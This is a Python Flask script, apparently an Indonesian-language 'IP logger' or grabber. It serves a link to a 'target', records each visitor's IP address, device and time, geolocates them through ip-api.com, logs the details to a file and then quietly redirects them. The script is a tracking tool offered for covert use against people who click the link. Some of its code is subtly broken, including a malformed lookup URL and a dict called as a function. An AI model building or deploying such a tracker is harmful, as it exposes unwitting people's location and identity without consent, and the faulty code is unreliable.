import fractions
from flask import Flask, request, redirect
from datetime import datetime
import logging
import sys
import requests
from rich.console import Console
from rich.table import Table
import pyfiglet

console = Console()

app = Flask(__name__)
#file menyimpan informasi log
log_file = "loginfo.txt"
#mematikan log bawaan flask
log = logging.getLogger('wsgi')
log.setLevel(logging.ERROR)

target_url = ""

def info_lokasi(ip):
  if ip == "127.0.0.1" or ip.startswith("192.168.") or ip.startswith("10."):
    return "Lokal", "Indonesia", "Local Network"
  #API gratis dari ip-api.com
  try: 
    url = f"http://ip-api.com{ip}"
    respon = requests.get(url, timeout=5).json()
    if respon("status") == "success":
      kota = respon.get("city", "tidak diketahui")
      negara = respon.get("country", "tidak diketahui")
      isp = respon.get("isp", "tidak diketahui")
      return kota, negara, isp
  except Exception:
    pass

  return "tidak diketahui", "tidak diketahui", "tidak diketahui"

@app.route('/')
def logger():
  global target_url
  #ambil ip publik pengunjung
  if request.headers.get('X-Forwarded-For'):
    ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
  else:
    ip_address = request.remote_addr
  #ambil informasi waktu & perangkat
  user_agent = request.headers.get('User-Agent')
  current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
  #lacak lokas & isp secara r-t
  kota, negara, isp = info_lokasi(ip_address)
  #menyimpan file informasi log
  log_entry = f"[{current_time}] IP: {ip_address} | Lokasi: {kota}, {negara} | ISP: {isp} | Device: {user_agent}\n"
  with open(log_file, "a") as f:
    f.write(log_entry)

  table = Table(title="", show_header=True, header_style="magenta", show_lines=True)
  table.add_column("informasi", style="bold cyan", width=12, no_wrap=True)
  table.add_column("detail", style="green", width=44)

  table.add_row("Waktu", f"{current_time}")
  table.add_row("IP", f"{ip_address}")
  table.add_row("Lokasi", f"{kota}, {negara}")
  table.add_row("Provider", f"{isp}")
  table.add_row("Device", f"{user_agent}")

  print("[¡] TARGET MENGAKSES!")
  console.print(table)

  return redirect(target_url)


if __name__ == '__main__':
  header = pyfiglet.figlet_format("MY IP LOGGER", font="standard")
  print(header)

  user = input("[+] Masukkan link URL tujuan:\n")
  if not user:
    print("[-] Link URL kosong,\n[red]PROGRAM KELUAR![/]")
    sys.exit()
  #format tautan http:// atau https://
  if not user.startswith('http://') and not user.startswith('https://'):
    target_url = 'https://' + user
  else:
    target_url = user

  print(f"[#] Link URL tujuan: {target_url}")
  print("[#] Menjalankan localhost di port 5000...")
  print("[*] Hosting untuk menghubungkan ke internet.")
  print("[*] Menunggu target mengakses link...")
  print("=" * 56)

  app.run(host='0.0.0.0', port=5000, debug=False)
